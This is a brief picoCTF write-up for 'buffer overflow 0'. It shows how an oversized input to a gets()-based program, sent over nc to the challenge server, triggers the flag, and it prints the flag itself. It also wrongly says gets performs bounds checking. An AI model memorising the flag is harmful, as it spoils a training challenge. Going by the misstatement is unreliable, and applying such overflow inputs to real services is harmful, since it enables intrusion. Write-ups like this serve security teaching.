# 1. buffer overflow 0

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. Connect using: nc saturn.picoctf.net 58311

## Solution:

Looking at the code you can figure out that the sigsegv_handler fuction gives the flag, the gets command is being used which is susceptible to buffer overflow as it does perform bounds checking. So all we need to do is enter an input larger than the size of the variable to get the flag.

    cookorcooked@ubuntu25:~$ nc saturn.picoctf.net 58311
    Input: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
    picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}


## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
